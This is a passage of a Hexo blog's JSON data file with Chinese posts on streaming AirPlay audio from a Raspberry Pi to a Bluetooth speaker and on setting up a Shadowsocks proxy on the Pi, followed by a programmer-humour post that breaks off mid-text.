rel=\"external\">https://github.com/mikebrady/shairport-sync</a><br><a href=\"http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html\" target=\"_blank\" rel=\"external\">http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html</a><br><a href=\"http://wangye.org/blog/archives/921/\" target=\"_blank\" rel=\"external\">http://wangye.org/blog/archives/921/</a><br><a href=\"http://blog.csdn.net/huayucong/article/details/51376461\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/huayucong/article/details/51376461</a><br><a href=\"http://blog.csdn.net/zhaoqi_0612/article/details/47731821\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/zhaoqi_0612/article/details/47731821</a><br><a href=\"http://blog.csdn.net/techtitan/article/details/6165116\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/techtitan/article/details/6165116</a><br><a href=\"http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1\" target=\"_blank\" rel=\"external\">http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1</a></p>\n","excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。<br>于是萌生了一个想法，正好手上有个树莓派，能不能这样：</p>\n<blockquote>\n<p>iOS设备-&gt;Airplay-&gt;树莓派-&gt;蓝牙-&gt;小米蓝牙音箱<br>","more":"<br><img src=\"/content/images/2016/08/DSC07326-5.JPG\" alt=\"\"></p>\n</blockquote>\n<p>因此这个问题可以分为两个部分：</p>\n<ul>\n<li>1.树莓派蓝牙音频配置部分</li>\n<li>2.树莓派Airplay播放部分</li>\n</ul>\n<p>在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。</p>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ul>\n<li>树莓派3</li>\n<li>小米蓝牙音箱</li>\n<li>iOS设备</li>\n</ul>\n<h1 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h1><h2 id=\"树莓派安装Shairport-Sync\"><a href=\"#树莓派安装Shairport-Sync\" class=\"headerlink\" title=\"树莓派安装Shairport Sync\"></a>树莓派安装Shairport Sync</h2><p>Shairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。<br>安装前请确认是否安装以下依赖包：</p>\n<ul>\n<li><code>apt-get install build-essential git</code></li>\n<li><code>apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev</code></li>\n<li><code>apt-get install avahi-daemon libavahi-client-dev</code> </li>\n<li><code>apt-get install libssl-dev</code> </li>\n<li><code>apt-get install libpolarssl-dev</code> </li>\n<li><code>apt-get install libsoxr-dev</code> </li>\n</ul>\n<p>随后下载Shairport Sync：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/mikebrady/shairport-sync.git</div></pre></td></tr></table></figure></p>\n<p>然后<code>cd</code>到相应目录，执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">autoreconf -i <span class=\"_\">-f</span></div></pre></td></tr></table></figure></p>\n<p>随后执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd</div></pre></td></tr></table></figure></p>\n<p>如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">make</div></pre></td></tr></table></figure></p>\n<p>创建开机启动：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">getent group shairport-sync &amp;&gt;/dev/null || sudo groupadd -r shairport-sync &gt;/dev/null</div><div class=\"line\"></div><div class=\"line\">getent passwd shairport-sync &amp;&gt; /dev/null || sudo useradd -r -M -g shairport-sync <span class=\"_\">-s</span> /usr/bin/nologin -G audio shairport-sync &gt;/dev/null</div></pre></td></tr></table></figure></p>\n<p>然后运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo make install</div></pre></td></tr></table></figure></p>\n<p>最后输入，完成安装：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo update-rc.d shairport-sync defaults 90 10</div></pre></td></tr></table></figure></p>\n<h2 id=\"树莓派安装蓝牙\"><a href=\"#树莓派安装蓝牙\" class=\"headerlink\" title=\"树莓派安装蓝牙\"></a>树莓派安装蓝牙</h2><p>打开终端，用普通用户权限执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get updgrade -y</div><div class=\"line\">sudo apt-get dist-upgrade -y</div></pre></td></tr></table></figure></p>\n<p>随后安装蓝牙及管理软件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install pi-bluetooth bluez bluez-firmware blueman</div></pre></td></tr></table></figure></p>\n<p>将pi用户添加到蓝牙组<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo usermod -G bluetooth <span class=\"_\">-a</span> pi</div></pre></td></tr></table></figure></p>\n<p>还有很<strong>重要</strong>的一条，安装蓝牙音频配置<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install pulseaudio pulseaudio-module-bluetooth</div></pre></td></tr></table></figure></p>\n<p>随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。<br>也可通过bluetoothctl或hictool命令进行配对。<br>随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。</p>\n<p><strong>在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。</strong></p>\n<h2 id=\"配置蓝牙音频及Shariport-Sync\"><a href=\"#配置蓝牙音频及Shariport-Sync\" class=\"headerlink\" title=\"配置蓝牙音频及Shariport Sync\"></a>配置蓝牙音频及Shariport Sync</h2><p>安装依赖包：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install libdbus-1-dev</div><div class=\"line\">sudo apt-get install libglib2.0-dev</div><div class=\"line\">apt-cache search libasound</div><div class=\"line\">sudo apt-get install libasound2-dev</div></pre></td></tr></table></figure></p>\n<p>配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz</div><div class=\"line\">tar -xvf bluez-4.101.tar.xz</div><div class=\"line\"><span class=\"built_in\">cd</span> bluez-4.101</div><div class=\"line\">./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib</div><div class=\"line\">make</div><div class=\"line\">sudo make install</div></pre></td></tr></table></figure></p>\n<p>复制配置文件到目录：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/simple-agent /usr/bin/bluez-simple-agent</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/<span class=\"built_in\">test</span>-device /usr/bin/bluez-test-device</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/<span class=\"built_in\">test</span>-audio /usr/bin/bluez-test-audio</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/</div></pre></td></tr></table></figure></p>\n<p>接着运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install python-dbus</div><div class=\"line\">sudo apt-get install python-gobject</div><div class=\"line\">sudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/</div></pre></td></tr></table></figure></p>\n<p>编辑audio.conf文件使shariport的音频从蓝牙设备输出：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/bluetooth/audio.conf</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 在[General]区域添加:</span></div><div class=\"line\">Enable=Sink,Socket</div><div class=\"line\"><span class=\"comment\"># 取消[A2DP]注释，并加入:</span></div><div class=\"line\">Maxconnections=4</div></pre></td></tr></table></figure>\n<p>打开蓝牙自启动:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> bluetooth</div></pre></td></tr></table></figure></p>\n<p>重启设备后，继续配置，打开asund.conf文件：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/asound.conf</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\">pcm.bt_canz &#123;</div><div class=\"line\">type plug</div><div class=\"line\">slave &#123;</div><div class=\"line\">pcm &#123;</div><div class=\"line\">type bluetooth</div><div class=\"line\">device XX:XX:XX:XX:XX:XX</div><div class=\"line\">profile <span class=\"string\">\"auto\"</span></div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">hint &#123;</div><div class=\"line\">show on</div><div class=\"line\">description <span class=\"string\">\"Mi Speaker\"</span></div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">ctl.bt_canz &#123;</div><div class=\"line\">type bluetooth</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>测试bluez能否使用：<code>sudo bluez-simple-agent</code>，如果正常，按ctrl+c停止。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX</div><div class=\"line\">sudo bluez-test-audio connect XX:XX:XX:XX:XX:XX</div></pre></td></tr></table></figure></p>\n<p>测试是否连通：<code>speaker-test -c 2 -D bt_canz</code></p>\n<p>再次重启设备。<br>开启后编辑<code>/etc/shairport-sync.conf</code>：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/shairport-sync.conf</div><div class=\"line\"><span class=\"comment\">#去掉下面的注释，并加入bt_canz</span></div><div class=\"line\">output_device = bt_canz</div></pre></td></tr></table></figure></p>\n<p>保存！重启！开机即可用。<br><img src=\"/content/images/2016/08/IMG_0635.PNG\" alt=\"\"></p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://github.com/mikebrady/shairport-sync/issues/200\">https://github.com/mikebrady/shairport-sync/issues/200</a><br><a href=\"https://github.com/mikebrady/shairport-sync\">https://github.com/mikebrady/shairport-sync</a><br><a href=\"http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html\">http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html</a><br><a href=\"http://wangye.org/blog/archives/921/\">http://wangye.org/blog/archives/921/</a><br><a href=\"http://blog.csdn.net/huayucong/article/details/51376461\">http://blog.csdn.net/huayucong/article/details/51376461</a><br><a href=\"http://blog.csdn.net/zhaoqi_0612/article/details/47731821\">http://blog.csdn.net/zhaoqi_0612/article/details/47731821</a><br><a href=\"http://blog.csdn.net/techtitan/article/details/6165116\">http://blog.csdn.net/techtitan/article/details/6165116</a><br><a href=\"http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1\">http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1</a></p>"},{"title":"树莓派搭建ss服务器","date":"2016-09-13T22:38:35.000Z","_content":"# 简介\n树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器\n\n# 为什么不用pptp vpn\n这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。\n\n# 一键配置脚本\n```\nwget http://mirrors.linuxeye.com/oneinstack.tar.gz\ntar xzf oneinstack.tar.gz\ncd oneinstack\n./shadowsocks.sh install\n```\n漫长的等待结束就好了\n\n# 慢慢配置\n## 安装Pip\n```\napt-get install python-pip python-gevent python-m2crypto\n```\n\n## 安装Shadowsocks\n```\npip install shadowsocks\n```\n\n## 创建Shadowsocks配置文件\n配置文件 `/etc/shadowsocks.json` 内容如下：\n```\n{\n    \"server\":\"0.0.0.0\",\n    \"server_port\":8388,\n    \"local_address\": \"127.0.0.1\",\n    \"local_port\":1080,\n    \"password\":\"密码\",\n    \"timeout\":300,\n    \"method\":\"aes-256-cfb\",\n    \"fast_open\": false,\n    \"workers\": 1\n}\n```\n## 启动服务\n```\nnohup ssserver -c /etc/shadowsocks.json &\n```\n\n## 设定为自动启动的方法\n写入 `nohup ssserver -c /etc/shadowsocks.json &` 到 /etc/rc.local 文件的 exit 之前。\n","source":"_posts/树莓派搭建ss服务器.md","raw":"---\ntitle: 树莓派搭建ss服务器\ndate: 2016-09-13 23:38:35\npermalink: ss-server\ntags: Raspberry\ncategories: Linux\n\n---\n# 简介\n树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器\n\n# 为什么不用pptp vpn\n这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。\n\n# 一键配置脚本\n```\nwget http://mirrors.linuxeye.com/oneinstack.tar.gz\ntar xzf oneinstack.tar.gz\ncd oneinstack\n./shadowsocks.sh install\n```\n漫长的等待结束就好了\n\n# 慢慢配置\n## 安装Pip\n```\napt-get install python-pip python-gevent python-m2crypto\n```\n\n## 安装Shadowsocks\n```\npip install shadowsocks\n```\n\n## 创建Shadowsocks配置文件\n配置文件 `/etc/shadowsocks.json` 内容如下：\n```\n{\n    \"server\":\"0.0.0.0\",\n    \"server_port\":8388,\n    \"local_address\": \"127.0.0.1\",\n    \"local_port\":1080,\n    \"password\":\"密码\",\n    \"timeout\":300,\n    \"method\":\"aes-256-cfb\",\n    \"fast_open\": false,\n    \"workers\": 1\n}\n```\n## 启动服务\n```\nnohup ssserver -c /etc/shadowsocks.json &\n```\n\n## 设定为自动启动的方法\n写入 `nohup ssserver -c /etc/shadowsocks.json &` 到 /etc/rc.local 文件的 exit 之前。\n","slug":"ss-server","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xpj003u5es5dv5tensm","content":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器</p>\n<h1 id=\"为什么不用pptp-vpn\"><a href=\"#为什么不用pptp-vpn\" class=\"headerlink\" title=\"为什么不用pptp vpn\"></a>为什么不用pptp vpn</h1><p>这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。</p>\n<h1 id=\"一键配置脚本\"><a href=\"#一键配置脚本\" class=\"headerlink\" title=\"一键配置脚本\"></a>一键配置脚本</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://mirrors.linuxeye.com/oneinstack.tar.gz</div><div class=\"line\">tar xzf oneinstack.tar.gz</div><div class=\"line\">cd oneinstack</div><div class=\"line\">./shadowsocks.sh install</div></pre></td></tr></table></figure>\n<p>漫长的等待结束就好了</p>\n<h1 id=\"慢慢配置\"><a href=\"#慢慢配置\" class=\"headerlink\" title=\"慢慢配置\"></a>慢慢配置</h1><h2 id=\"安装Pip\"><a href=\"#安装Pip\" class=\"headerlink\" title=\"安装Pip\"></a>安装Pip</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">apt-get install python-pip python-gevent python-m2crypto</div></pre></td></tr></table></figure>\n<h2 id=\"安装Shadowsocks\"><a href=\"#安装Shadowsocks\" class=\"headerlink\" title=\"安装Shadowsocks\"></a>安装Shadowsocks</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install shadowsocks</div></pre></td></tr></table></figure>\n<h2 id=\"创建Shadowsocks配置文件\"><a href=\"#创建Shadowsocks配置文件\" class=\"headerlink\" title=\"创建Shadowsocks配置文件\"></a>创建Shadowsocks配置文件</h2><p>配置文件 <code>/etc/shadowsocks.json</code> 内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">    &quot;server&quot;:&quot;0.0.0.0&quot;,</div><div class=\"line\">    &quot;server_port&quot;:8388,</div><div class=\"line\">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</div><div class=\"line\">    &quot;local_port&quot;:1080,</div><div class=\"line\">    &quot;password&quot;:&quot;密码&quot;,</div><div class=\"line\">    &quot;timeout&quot;:300,</div><div class=\"line\">    &quot;method&quot;:&quot;aes-256-cfb&quot;,</div><div class=\"line\">    &quot;fast_open&quot;: false,</div><div class=\"line\">    &quot;workers&quot;: 1</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h2 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nohup ssserver -c /etc/shadowsocks.json &amp;</div></pre></td></tr></table></figure>\n<h2 id=\"设定为自动启动的方法\"><a href=\"#设定为自动启动的方法\" class=\"headerlink\" title=\"设定为自动启动的方法\"></a>设定为自动启动的方法</h2><p>写入 <code>nohup ssserver -c /etc/shadowsocks.json &amp;</code> 到 /etc/rc.local 文件的 exit 之前。</p>\n","excerpt":"","more":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器</p>\n<h1 id=\"为什么不用pptp-vpn\"><a href=\"#为什么不用pptp-vpn\" class=\"headerlink\" title=\"为什么不用pptp vpn\"></a>为什么不用pptp vpn</h1><p>这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。</p>\n<h1 id=\"一键配置脚本\"><a href=\"#一键配置脚本\" class=\"headerlink\" title=\"一键配置脚本\"></a>一键配置脚本</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://mirrors.linuxeye.com/oneinstack.tar.gz</div><div class=\"line\">tar xzf oneinstack.tar.gz</div><div class=\"line\">cd oneinstack</div><div class=\"line\">./shadowsocks.sh install</div></pre></td></tr></table></figure>\n<p>漫长的等待结束就好了</p>\n<h1 id=\"慢慢配置\"><a href=\"#慢慢配置\" class=\"headerlink\" title=\"慢慢配置\"></a>慢慢配置</h1><h2 id=\"安装Pip\"><a href=\"#安装Pip\" class=\"headerlink\" title=\"安装Pip\"></a>安装Pip</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">apt-get install python-pip python-gevent python-m2crypto</div></pre></td></tr></table></figure>\n<h2 id=\"安装Shadowsocks\"><a href=\"#安装Shadowsocks\" class=\"headerlink\" title=\"安装Shadowsocks\"></a>安装Shadowsocks</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install shadowsocks</div></pre></td></tr></table></figure>\n<h2 id=\"创建Shadowsocks配置文件\"><a href=\"#创建Shadowsocks配置文件\" class=\"headerlink\" title=\"创建Shadowsocks配置文件\"></a>创建Shadowsocks配置文件</h2><p>配置文件 <code>/etc/shadowsocks.json</code> 内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">    &quot;server&quot;:&quot;0.0.0.0&quot;,</div><div class=\"line\">    &quot;server_port&quot;:8388,</div><div class=\"line\">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</div><div class=\"line\">    &quot;local_port&quot;:1080,</div><div class=\"line\">    &quot;password&quot;:&quot;密码&quot;,</div><div class=\"line\">    &quot;timeout&quot;:300,</div><div class=\"line\">    &quot;method&quot;:&quot;aes-256-cfb&quot;,</div><div class=\"line\">    &quot;fast_open&quot;: false,</div><div class=\"line\">    &quot;workers&quot;: 1</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h2 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nohup ssserver -c /etc/shadowsocks.json &amp;</div></pre></td></tr></table></figure>\n<h2 id=\"设定为自动启动的方法\"><a href=\"#设定为自动启动的方法\" class=\"headerlink\" title=\"设定为自动启动的方法\"></a>设定为自动启动的方法</h2><p>写入 <code>nohup ssserver -c /etc/shadowsocks.json &amp;</code> 到 /etc/rc.local 文件的 exit 之前。</p>\n"},{"title":"程序员鄙视链","date":"2016-10-12T14:07:48.000Z","_content":"\n纯粹的一些梗，比较搞笑。来源知乎和其他网站。\n<!-- more --> \n\n# 编辑器\nEmacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad\n# 语言\nasm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all\n\n# 操作系统\nUnix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br>*BSD ↔ System*<br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian* → Redhat*<br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all\n# IDE\nEmacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0\n\n# 图片\n\n![](/content/images/chain/1.jpg)\n\n![](/content/images/chain/2.jpg)\n\n![](/content/images/chain/3.jpg)\n\n![](/content/images/chain/4.jpg)\n\n![](/content/images/chain/5.jpg)\n\n** 工具篇 **\n![](/content/images/chain/6.jpg)\n\n![](/content/images/chain/7.jpg)\n\n![](/content/images/chain/8.jpg)\n\n![](/content/images/chain/9.jpg)\n\n** 系统软件篇 **\n\n![](/content/images/chain/10.jpg)\n\n![](/content/images/chain/11.jpg)\n\n![](/content/images/chain/12.jpg)\n\n![](/content/images/chain/13.jpg)\n\n** 职场篇 **\n\n![](/content/images/chain/14.jpg)\n\n![](/content/images/chain/15.jpg)\n\n![](/content/images/chain/16.jpg)\n\n![](/content/images/chain/17.jpg)\n\n> 转载自：https://www.zhihu.com/question/24270600\n","source":"_posts/程序员鄙视链.md","raw":"---\ntitle: 程序员鄙视链\ndate: 2016-10-12 15:07:48\ntags: 笑话\ncategories: 笑话\n---\n\n纯粹的一些梗，比较搞笑。来源知乎和其他网站。\n<!-- more --> \n\n# 编辑器\nEmacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad\n# 语言\nasm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all\n\n# 操作系统\nUnix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br>*BSD ↔ System*<br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian* → Redhat*<br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all\n# IDE\nEmacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0\n\n# 图片\n\n![](/content/images/chain/1.jpg)\n\n![](/content/images/chain/2.jpg)\n\n![](/content/images/chain/3.jpg)\n\n![](/content/images/chain/4.jpg)\n\n![](/content/images/chain/5.jpg)\n\n** 工具篇 **\n![](/content/images/chain/6.jpg)\n\n![](/content/images/chain/7.jpg)\n\n![](/content/images/chain/8.jpg)\n\n![](/content/images/chain/9.jpg)\n\n** 系统软件篇 **\n\n![](/content/images/chain/10.jpg)\n\n![](/content/images/chain/11.jpg)\n\n![](/content/images/chain/12.jpg)\n\n![](/content/images/chain/13.jpg)\n\n** 职场篇 **\n\n![](/content/images/chain/14.jpg)\n\n![](/content/images/chain/15.jpg)\n\n![](/content/images/chain/16.jpg)\n\n![](/content/images/chain/17.jpg)\n\n> 转载自：https://www.zhihu.com/question/24270600\n","slug":"程序员鄙视链","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xpk003x5es5yojmiidf","content":"<p>纯粹的一些梗，比较搞笑。来源知乎和其他网站。<br><a id=\"more\"></a> </p>\n<h1 id=\"编辑器\"><a href=\"#编辑器\" class=\"headerlink\" title=\"编辑器\"></a>编辑器</h1><p>Emacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → 